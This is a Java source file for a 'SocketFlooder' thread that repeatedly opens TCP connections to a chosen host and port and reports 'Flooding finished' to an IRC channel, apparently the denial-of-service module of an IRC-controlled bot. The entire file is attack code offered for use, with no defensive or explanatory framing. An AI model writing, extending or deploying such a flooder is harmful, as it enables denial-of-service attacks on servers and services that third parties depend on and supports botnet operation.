import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
/**
 * SocketFlooder Class
 * @author Nathan
 *
 */
public class SocketFlooder extends Thread {
	/**
	 * Sets the url, port, times and delay between each socket attempt
	 * @param url
	 * @param port
	 * @param times
	 * @param delay
	 */
	public SocketFlooder(String url, int port, int times, int delay) 
	{
		this.url = url;
		this.port = port;
		this.times = times;
		this.delay = delay;
	}
	/**
	 * Starts socket flooding on a new thread
	 */
	@SuppressWarnings("deprecation")
	public void run() 
	{
		for(int i = 0; i < times; i++) {
			try {
				if(!flooding) {
					IRC.sendMessage(Config.getChannel(), "Flooding finished");
					return;
				}
				@SuppressWarnings("unused")
				Socket s = new Socket(url, port);
				flooding = true;
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				Thread.sleep(delay);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		IRC.sendMessage(Config.getChannel(), "Flooding finished!");
		stop();
	}
	
	private String url;
	private int port;
	private int times;
	private int delay;
	public static boolean flooding = false;

}
